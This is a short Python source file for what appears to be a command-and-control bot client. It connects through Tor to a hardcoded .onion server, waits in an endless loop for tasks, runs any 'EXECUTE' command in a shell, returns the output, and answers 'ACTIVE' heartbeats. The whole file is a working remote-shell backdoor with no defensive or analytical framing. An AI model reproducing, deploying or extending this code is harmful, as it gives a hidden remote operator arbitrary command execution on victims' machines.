from network import ClientSocket, Tor
import tasks


class Client:
	BUFFERSIZE = 1024

	def __init__(self):
		self.__tor = Tor()
		self.__sock = ClientSocket('4u2hjbuzegxrppe2d37majzc3ttpk2hiks2k6ggcduejcl7zehcpguad.onion', 8843)

	"""
	Once the connection is established the client receives tasks,
	and responds with the corresponding output.
	"""
	def run(self):
		while True:
			# receive task
			task, args = self.__sock.receive(self.BUFFERSIZE)
			# evaluate output
			if task == 'EXECUTE':
				command = args[0]
				output = tasks.executeShell(command)
				self.__sock.send(output)
			elif task == 'ACTIVE':
				self.__sock.send('ACTIVE')


if __name__ == '__main__':
	client = Client()
	client.run()